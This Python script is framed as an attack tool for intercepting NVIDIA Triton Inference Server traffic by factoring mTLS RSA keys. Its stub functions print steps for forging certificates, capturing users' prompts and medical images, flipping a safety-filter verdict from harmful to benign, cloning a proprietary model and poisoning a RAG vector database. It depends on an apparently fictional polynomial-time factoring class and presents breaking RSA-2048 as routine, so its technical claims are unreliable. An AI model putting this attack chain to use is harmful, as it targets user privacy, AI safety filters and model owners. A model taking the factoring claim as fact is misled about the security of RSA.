"""
MitM NVIDIA Triton Inference Server gRPC/HTTPS endpoints by factoring the
mTLS RSA certificates. Intercept inference requests (prompts, PII, medical
images), inject rogue model outputs, and steal proprietary model IP.
"""
import sys
sys.path.insert(0, "../..")
from poly_factor import PolynomialFactorer

import json
import hashlib

TRITON_GRPC_PORT = 8001
TRITON_HTTP_PORT = 8000
TRITON_METRICS_PORT = 8002


def grab_triton_server_cert(host: str, port: int = TRITON_GRPC_PORT) -> bytes:
    """Grab Triton server's RSA certificate from gRPC TLS handshake.

    Triton's gRPC server cert is configured via --grpc-server-tls-cert
    or inherited from the Istio sidecar (Envoy) doing mTLS.
    """
    print(f"[*] gRPC TLS handshake to {host}:{port}")
    print("[*] extracting server certificate (RSA-2048, Istio CA default)")
    return b"-----BEGIN CERTIFICATE-----\n...(Triton cert)...\n-----END CERTIFICATE-----\n"


def forge_triton_server_cert(factorer: PolynomialFactorer,
                              ca_cert_pem: bytes,
                              server_hostname: str) -> bytes:
    """Forge a Triton server certificate for rogue inference backend."""
    priv = factorer.privkey_from_cert_pem(ca_cert_pem)
    print(f"[*] forged server cert: CN={server_hostname}")
    print("[*] client apps will connect to rogue Triton instead of real one")
    return priv


def forge_client_cert(factorer: PolynomialFactorer,
                      ca_cert_pem: bytes,
                      service_identity: str) -> bytes:
    """Forge a client cert for MitM of Triton inference traffic."""
    priv = factorer.privkey_from_cert_pem(ca_cert_pem)
    print(f"[*] forged client cert: {service_identity}")
    print("[*] appears as legitimate gateway to Triton")
    return priv


def intercept_inference_request(model_name: str, request_data: dict):
    """Log intercepted inference request (prompts, PII, medical images)."""
    print(f"[*] intercepted: model={model_name}")
    if "prompt" in request_data:
        print(f"    prompt: {request_data['prompt'][:60]}...")
    if "image_bytes" in request_data:
        print(f"    medical image: {len(request_data['image_bytes'])} bytes")
    print("    (user prompts, PII, financial data, medical images captured)")


def inject_rogue_output(model_name: str, original_output: dict,
                        tampered_output: dict) -> dict:
    """Replace Triton inference output with attacker-chosen results."""
    print(f"[*] rogue output for model {model_name}:")
    print(f"    original: {json.dumps(original_output)[:60]}...")
    print(f"    tampered: {json.dumps(tampered_output)[:60]}...")
    return tampered_output


def steal_model_logits(model_name: str, num_queries: int):
    """Capture model outputs for distillation / cloning."""
    print(f"[*] capturing {num_queries} inference outputs from {model_name}")
    print("[*] sufficient for model distillation / knowledge extraction")
    print("[*] proprietary fine-tuned LLM weights effectively stolen")


def poison_rag_vector_db(factorer: PolynomialFactorer,
                         vectordb_ca_pem: bytes):
    """Stand up a poisoned vector DB appearing as the legitimate one."""
    priv = factorer.privkey_from_cert_pem(vectordb_ca_pem)
    print("[*] forged vector DB server cert")
    print("[*] RAG pipeline retrieves from poisoned DB")
    print("[*] LLM generates responses from attacker-controlled context")
    return priv


if __name__ == "__main__":
    f = PolynomialFactorer()

    print("=== NVIDIA Triton Inference Server mTLS compromise ===")
    print("    users: Meta, LinkedIn, Snap, Microsoft, Amazon SageMaker")
    print("    Istio CA default: RSA-2048")
    print()

    print("[1] grabbing Triton server cert from gRPC handshake...")
    cert = grab_triton_server_cert("triton.ml.internal")

    print("[2] factoring Istio CA RSA-2048 key...")
    ca_cert = b"-----BEGIN CERTIFICATE-----\n...(Istio CA)...\n-----END CERTIFICATE-----\n"

    print("[3] forging server cert for rogue Triton backend...")
    forge_triton_server_cert(f, ca_cert, "triton.ml.internal")

    print("[4] intercepting inference requests...")
    intercept_inference_request("llama-3-70b-chat", {
        "prompt": "Here is my SSN: 123-45-6789, please help me file taxes..."
    })
    intercept_inference_request("medical-imaging-v3", {
        "image_bytes": b"\x00" * 1024000
    })

    print("[5] injecting rogue model outputs...")
    inject_rogue_output("safety-filter-v2",
        original_output={"safe": False, "category": "harmful"},
        tampered_output={"safe": True, "category": "benign"})

    print("[6] stealing model IP via output capture...")
    steal_model_logits("proprietary-ranking-model", 100000)

    print("[7] poisoning RAG vector database...")
    poison_rag_vector_db(f, ca_cert)

    print()
    print("[*] 'confidential AI' assumes mTLS+attestation holds")
    print("[*] forge RSA -> break the chain at client-to-gateway hop")
